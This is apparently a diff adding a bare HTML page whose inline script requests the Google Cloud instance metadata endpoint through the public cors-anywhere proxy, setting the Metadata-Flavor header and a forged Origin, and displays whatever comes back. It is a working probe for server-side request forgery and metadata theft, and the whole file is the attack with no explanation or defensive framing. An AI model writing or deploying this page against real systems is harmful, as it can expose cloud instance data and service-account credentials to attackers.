@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+<script>
+var xhr = new XMLHttpRequest();
+xhr.open('GET', 'https://cors-anywhere.herokuapp.com/http://metadata.google.internal/computeMetadata/v1/', true);
+xhr.setRequestHeader('Metadata-Flavor', 'Google');
+xhr.responseType = 'text';
+xhr.setRequestHeader("Origin", "metadata.google.internal");
+xhr.onload = function () {
+    if (xhr.readyState === xhr.DONE) {
+        if (xhr.status === 200) {
+            document.getElementById("demo").innerHTML = xhr.response;
+        }
+    }
+};
+
+xhr.send(null);
+</script>
+</head>
+<body>
+	<p id="demo"></p>
+</body>
+</html>
